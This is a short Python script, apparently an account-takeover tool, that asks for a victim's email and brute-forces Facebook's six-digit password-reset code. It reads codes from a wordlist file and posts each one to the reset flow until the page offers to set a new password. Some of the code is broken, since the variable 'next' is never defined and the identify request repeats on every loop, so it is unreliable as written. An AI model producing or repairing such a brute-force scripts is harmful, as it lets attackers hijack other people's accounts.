import requests
import sys

email = raw_input("email_> ")

url='https://free.facebook.com/login/identify'
toket = open('Fuzzing_6-digits-000000-999999.txt', 'r').readlines()

for line in toket:
    code = line.strip()
    http = requests.post(url, data={'email' :email, 'search':'sumbit'})
    http = requests.post(next, data={'continue':'sumbit'})
    http = requests.post(next, data={'code' :code, 'continue':'sumbit'})
    content = http.content
    if "enter a new password" in content:
        print "[+] code found ",code
        sys.exit()
    else:
        print "[!] code invalid ",code
